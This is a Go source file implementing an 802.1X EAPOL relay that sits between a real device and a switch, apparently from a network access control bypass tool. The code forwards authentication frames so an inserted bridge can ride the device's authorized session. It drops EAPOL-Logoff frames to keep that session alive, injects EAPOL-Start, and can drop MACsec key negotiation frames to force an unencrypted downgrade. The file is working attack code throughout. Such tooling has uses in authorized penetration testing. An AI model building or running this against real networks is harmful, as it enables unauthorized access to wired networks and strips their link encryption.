package eapol

import (
	"context"
	"errors"
	"fmt"
	"net"
	"strings"
	"sync"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Relay transparently forwards EAPOL frames between the supplicant (real device)
// on ifaceA and the authenticator (switch) on ifaceB.
//
// The relay is bidirectional:
//   - Switch→Device: EAPOL frames arriving on ifaceB are injected onto ifaceA
//   - Device→Switch: EAPOL frames arriving on ifaceA are injected onto ifaceB
//
// The relay also monitors the exchange:
//   - Detects EAP-Success/Failure to signal auth complete
//   - Detects EAPOL-Key (MKA) for MACsec negotiation
//   - Handles re-authentication transparently
//   - Optionally suppresses EAPOL-Logoff from the supplicant
type Relay struct {
	ifaceA  string // Device port (supplicant side)
	ifaceB  string // Switch port (authenticator side)
	session *AuthSession
	logFunc func(string)

	mu             sync.Mutex
	suppressLogoff bool
	injectStart    bool
	strictAuthMAC  bool
	strictVLAN     bool
	initialFrame   []byte
	modeName       string
	downgrader     *Downgrader
	authSignal     chan AuthResult
}

// NewRelay creates a new EAPOL relay between two interfaces.
// ifaceA = device/supplicant side, ifaceB = switch/authenticator side.
func NewRelay(ifaceA, ifaceB string, session *AuthSession, logFunc func(string)) *Relay {
	if logFunc == nil {
		logFunc = func(string) {}
	}
	return &Relay{
		ifaceA:         ifaceA,
		ifaceB:         ifaceB,
		session:        session,
		logFunc:        logFunc,
		suppressLogoff: true, // Default: suppress logoff to keep session alive
		injectStart:    true, // Manual relay prompts the authenticator by default
		strictAuthMAC:  true, // Manual relay pins authenticator direction once learned
		strictVLAN:     true, // Manual relay pins VLAN once learned
		modeName:       "EAPOL relay",
		authSignal:     make(chan AuthResult, 8), // Buffered to avoid dropping re-auth results
	}
}

// SetSuppressLogoff controls whether EAPOL-Logoff from the supplicant is dropped.
func (r *Relay) SetSuppressLogoff(suppress bool) {
	r.mu.Lock()
	r.suppressLogoff = suppress
	r.mu.Unlock()
	if suppress {
		r.logFunc("[EAPOL] drop-logoff enabled: EAPOL-Logoff frames will be dropped.")
	} else {
		r.logFunc("[EAPOL] drop-logoff disabled: EAPOL-Logoff frames will pass.")
	}
}

// SetInjectStart controls whether the relay emits an EAPOL-Start after it is armed.
func (r *Relay) SetInjectStart(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.injectStart = enabled
}

// SetStrictAuthenticator controls whether switch-side EAPOL must keep the first
// observed authenticator source MAC. Transparent passthrough keeps this disabled
// because stacks and some switches may source different EAPOL phases differently.
func (r *Relay) SetStrictAuthenticator(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.strictAuthMAC = enabled
}

// SetStrictVLAN controls whether EAPOL is pinned to the first observed VLAN.
func (r *Relay) SetStrictVLAN(enabled bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.strictVLAN = enabled
}

// SetInitialFrame queues the first device-side frame that triggered MAC lock for
// forwarding after relay capture goroutines are armed.
func (r *Relay) SetInitialFrame(frame []byte) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.initialFrame = append([]byte(nil), frame...)
}

// SetModeName changes the short name used in relay logs.
func (r *Relay) SetModeName(name string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if name != "" {
		r.modeName = name
	}
}

// SetDowngrade controls MACsec downgrade behavior.
func (r *Relay) SetDowngrade(enabled bool) {
	r.mu.Lock()
	stateChanged := false
	if enabled {
		if r.downgrader == nil || !r.downgrader.IsEnabled() {
			r.downgrader = NewDowngrader()
			stateChanged = true
		}
		r.mu.Unlock()
		if stateChanged && r.session != nil {
			r.session.SetState(StateDowngrading)
		}
		r.logFunc("[MACSEC] macsec-downgrade enabled: EAPOL-MKA type 5 frames will be dropped.")
		return
	}
	if r.downgrader != nil && r.downgrader.IsEnabled() {
		r.downgrader.Disable()
	}
	r.mu.Unlock()
	r.logFunc("[MACSEC] macsec-downgrade disabled: EAPOL-MKA type 5 frames will pass.")
}

// Start begins bidirectional EAPOL relay. This runs until the context is cancelled.
// It handles the full lifecycle including initial auth, re-auth, and logoff suppression.
func (r *Relay) Start(ctx context.Context) error {
	if ctx == nil {
		return fmt.Errorf("relay context is required")
	}
	if r == nil || r.session == nil {
		return fmt.Errorf("relay session is required")
	}
	r.ifaceA = strings.TrimSpace(r.ifaceA)
	r.ifaceB = strings.TrimSpace(r.ifaceB)
	if r.ifaceA == "" || r.ifaceB == "" {
		return fmt.Errorf("both relay interfaces are required")
	}
	if r.ifaceA == r.ifaceB {
		return fmt.Errorf("relay interfaces must differ")
	}
	snapshot := r.session.Snapshot()
	if !validUnicastMAC(snapshot.SupplicantMAC) {
		return fmt.Errorf("relay supplicant MAC must be a 48-bit unicast address")
	}
	r.session.SetState(StateRelaying)

	// Open raw pcap handles on both interfaces for EAPOL.
	handleA, err := pcap.OpenLive(r.ifaceA, 65535, true, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceA, err)
	}

	handleB, err := pcap.OpenLive(r.ifaceB, 65535, true, pcap.BlockForever)
	if err != nil {
		handleA.Close()
		return fmt.Errorf("opening %s for EAPOL relay: %w", r.ifaceB, err)
	}
	var closeOnce sync.Once
	closeHandles := func() {
		closeOnce.Do(func() {
			handleA.Close()
			handleB.Close()
		})
	}
	defer closeHandles()

	// BPF filter on both to only see EAPOL frames.
	if err := handleA.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceA, err)
	}
	if err := handleB.SetBPFFilter(BPFFilter); err != nil {
		return fmt.Errorf("BPF filter on %s: %w", r.ifaceB, err)
	}

	r.mu.Lock()
	modeName := r.modeName
	r.mu.Unlock()
	r.logFunc(fmt.Sprintf("[RELAY] %s active: %s (device) ⟷ %s (switch)", modeName, r.ifaceA, r.ifaceB))

	// A context cannot wake a libpcap read opened with BlockForever. The handle
	// owner therefore closes both handles on cancellation and waits for both
	// relay directions before returning.
	watcherDone := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			closeHandles()
		case <-watcherDone:
		}
	}()

	results := make(chan error, 2)

	// Switch→Device: frames from authenticator relayed to supplicant.
	go func() {
		results <- r.relayDirection(ctx, handleB, handleA, "switch→device")
	}()

	// Device→Switch: frames from supplicant relayed to authenticator.
	go func() {
		results <- r.relayDirection(ctx, handleA, handleB, "device→switch")
	}()

	r.mu.Lock()
	initialFrame := append([]byte(nil), r.initialFrame...)
	injectStart := r.injectStart
	r.mu.Unlock()

	// Forward the frame that triggered MAC lock after capture goroutines are armed.
	// In inline mode this avoids losing the first EAPOL-Start/DHCP/ARP packet while
	// the switch-facing port was intentionally held down.
	var startErr error
	if len(initialFrame) > 0 {
		if err := handleB.WritePacketData(initialFrame); err != nil {
			startErr = fmt.Errorf("inject initial trigger frame: %w", err)
		} else {
			r.logFunc("[RELAY] initial device frame forwarded to switch side")
		}
	}
	if startErr != nil {
		closeHandles()
	}

	// Manual relay can prompt the authenticator, but transparent passthrough disables
	// this and only forwards frames that naturally appear on the wire.
	if injectStart {
		r.session.mu.Lock()
		vlanID := r.session.vlanID
		supplicantMAC := copyMAC(r.session.supplicantMAC)
		r.session.mu.Unlock()
		if err := InjectEAPOLStartWithVLAN(r.ifaceB, supplicantMAC, vlanID, r.logFunc); err != nil {
			r.logFunc(fmt.Sprintf("[!][802.1X] EAPOL-Start injection failed (non-fatal): %v", err))
		}
	}

	var relayErr error
	for range 2 {
		if err := <-results; err != nil && ctx.Err() == nil {
			relayErr = errors.Join(relayErr, err)
		}
		// Bidirectional forwarding is one unit: a dead direction stops its peer.
		closeHandles()
	}
	close(watcherDone)
	return errors.Join(startErr, relayErr)
}

// WaitForAuth blocks until authentication succeeds, fails, or the context is cancelled.
func (r *Relay) WaitForAuth(ctx context.Context) (*AuthResult, error) {
	if ctx == nil {
		return nil, fmt.Errorf("authentication wait context is required")
	}
	if r == nil || r.authSignal == nil {
		return nil, fmt.Errorf("relay is not initialized")
	}
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	case result := <-r.authSignal:
		return &result, nil
	}
}

// relayDirection forwards EAPOL frames from src to dst, inspecting them along the way.
func (r *Relay) relayDirection(ctx context.Context, src, dst *pcap.Handle, label string) error {
	packetSource := gopacket.NewPacketSource(src, src.LinkType())
	for {
		packet, err := packetSource.NextPacket()
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			return fmt.Errorf("capture %s: %w", label, err)
		}
		if !r.shouldForward(packet, label) {
			continue
		}
		if err := dst.WritePacketData(packet.Data()); err != nil {
			return fmt.Errorf("inject %s: %w", label, err)
		}
		r.session.RecordRelay()
	}
}

func (r *Relay) shouldForward(packet gopacket.Packet, label string) bool {
	if packet == nil {
		return false
	}
	eth, ok := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet)
	if !ok || !r.acceptFrame(packet, eth, label) {
		return false
	}
	eapol, ok := packet.Layer(layers.LayerTypeEAPOL).(*layers.EAPOL)
	if !ok {
		return false
	}

	switch eapol.Type {
	case layers.EAPOLTypeEAP:
		r.handleEAPFrame(packet, eth, label)
	case layers.EAPOLTypeStart:
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Start from %s", label, eth.SrcMAC))
	case layers.EAPOLTypeLogOff:
		r.mu.Lock()
		suppress := r.suppressLogoff
		r.mu.Unlock()
		if suppress {
			r.logFunc(fmt.Sprintf("[!][RELAY] %s: EAPOL-Logoff received from %s", label, eth.SrcMAC))
			r.logFunc("           DROPPING PACKET to keep session alive")
			r.session.RecordDrop()
			return false
		}
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Logoff from %s — forwarding", label, eth.SrcMAC))
	case layers.EAPOLTypeKey:
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-Key frame from %s — forwarding", label, eth.SrcMAC))
	case layers.EAPOLType(5):
		r.session.mu.Lock()
		r.session.macsecDetected = true
		r.session.mu.Unlock()
		r.mu.Lock()
		downgrader := r.downgrader
		r.mu.Unlock()
		if downgrader != nil && downgrader.ShouldDrop(packet) {
			r.logFunc(fmt.Sprintf("[!][MACSEC] %s: MACsec (EAPOL Type %d) discovered. DROPPING PACKET to force downgrade", label, eapol.Type))
			r.session.RecordDrop()
			return false
		}
		r.logFunc(fmt.Sprintf("[MACSEC] %s: MACsec (EAPOL Type %d) key negotiation detected; forwarding", label, eapol.Type))
	}
	return true
}

func (r *Relay) acceptFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) bool {
	if packet == nil || eth == nil || len(eth.SrcMAC) != 6 {
		return false
	}
	r.mu.Lock()
	strictAuthMAC := r.strictAuthMAC
	strictVLAN := r.strictVLAN
	r.mu.Unlock()

	r.session.mu.Lock()
	defer r.session.mu.Unlock()

	supplicantMAC := r.session.supplicantMAC
	if len(supplicantMAC) == 0 {
		return false
	}

	switch label {
	case "device→switch":
		// Ignore reflected switch frames captured on the device-side handle.
		if !macEqual(eth.SrcMAC, supplicantMAC) {
			return false
		}
	case "switch→device":
		// Ignore our own injected supplicant frames captured by the switch-side handle.
		if macEqual(eth.SrcMAC, supplicantMAC) {
			return false
		}
		if len(r.session.authenticatorMAC) == 0 && eth.SrcMAC[0]&1 == 0 {
			r.session.authenticatorMAC = copyMAC(eth.SrcMAC)
		}
		if strictAuthMAC && len(r.session.authenticatorMAC) > 0 && !macEqual(eth.SrcMAC, r.session.authenticatorMAC) {
			return false
		}
	default:
		return false
	}

	if dot1q, ok := packet.Layer(layers.LayerTypeDot1Q).(*layers.Dot1Q); ok {
		if dot1q.VLANIdentifier != 0 {
			if r.session.vlanID == 0 {
				r.session.vlanID = dot1q.VLANIdentifier
			} else if r.session.vlanID != dot1q.VLANIdentifier {
				return !strictVLAN
			}
		}
	}

	return true
}

// handleEAPFrame inspects an EAP frame inside an EAPOL packet.
func (r *Relay) handleEAPFrame(packet gopacket.Packet, eth *layers.Ethernet, label string) {
	eap, ok := packet.Layer(layers.LayerTypeEAP).(*layers.EAP)
	if !ok {
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAPOL-EAP frame (no EAP layer parsed) from %s", label, eth.SrcMAC))
		return
	}

	// Track the authenticator MAC from the switch side.
	if label == "switch→device" {
		r.session.mu.Lock()
		if len(r.session.authenticatorMAC) == 0 {
			r.session.authenticatorMAC = copyMAC(eth.SrcMAC)
		}
		r.session.mu.Unlock()
	}

	// Track the EAP ID for session correlation.
	r.session.mu.Lock()
	r.session.lastEAPID = eap.Id
	r.session.mu.Unlock()

	switch eap.Code {
	case layers.EAPCodeRequest:
		method := eapTypeToMethod(uint8(eap.Type))
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Request Type=%s ID=%d from %s", label, method, eap.Id, eth.SrcMAC))

		// Update method if we see something more specific than Identity.
		if method != MethodUnknown && method != MethodIdentity {
			changed := false
			r.session.mu.Lock()
			if r.session.method == MethodUnknown || r.session.method == MethodIdentity {
				r.session.method = method
				changed = true
			}
			r.session.mu.Unlock()
			if changed {
				r.logFunc(fmt.Sprintf("[+][802.1X] EAP method negotiated: %s", method))
			}
		} else if method == MethodIdentity {
			var reauthCount int
			r.session.mu.Lock()
			if r.session.method == MethodUnknown {
				r.session.method = MethodIdentity
			}
			// Check if this is a re-auth (we were already authenticated).
			if r.session.state == StateAuthenticated {
				r.session.reauthCount++
				r.session.state = StateRelaying
				reauthCount = r.session.reauthCount
			}
			r.session.mu.Unlock()
			if reauthCount > 0 {
				r.logFunc(fmt.Sprintf("[*][802.1X] Re-authentication #%d initiated by authenticator", reauthCount))
			}
		}

	case layers.EAPCodeResponse:
		method := eapTypeToMethod(uint8(eap.Type))
		r.logFunc(fmt.Sprintf("[RELAY] %s: EAP-Response Type=%s ID=%d from %s", label, method, eap.Id, eth.SrcMAC))

	case layers.EAPCodeSuccess:
		r.logFunc(fmt.Sprintf("[+][802.1X] EAP-Success received (ID=%d) port AUTHORIZED", eap.Id))
		r.session.MarkAuthenticated()

		// Non-blocking send so the relay doesn't deadlock if nobody is waiting.
		r.session.mu.Lock()
		method := r.session.method
		macsec := r.session.macsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: true, Method: method, MACsecDetected: macsec}:
		default:
		}

	case layers.EAPCodeFailure:
		r.logFunc(fmt.Sprintf("[!][802.1X] EAP-Failure received (ID=%d) — authentication REJECTED", eap.Id))
		r.session.MarkFailed()

		r.session.mu.Lock()
		method := r.session.method
		macsec := r.session.macsecDetected
		r.session.mu.Unlock()
		select {
		case r.authSignal <- AuthResult{Success: false, Method: method, MACsecDetected: macsec}:
		default:
		}
	}
}

// copyMAC creates an independent copy of a MAC address.
func copyMAC(mac net.HardwareAddr) net.HardwareAddr {
	dup := make(net.HardwareAddr, len(mac))
	copy(dup, mac)
	return dup
}

func macEqual(a, b net.HardwareAddr) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func validUnicastMAC(mac net.HardwareAddr) bool {
	if len(mac) != 6 || mac[0]&1 != 0 {
		return false
	}
	for _, octet := range mac {
		if octet != 0 {
			return true
		}
	}
	return false
}
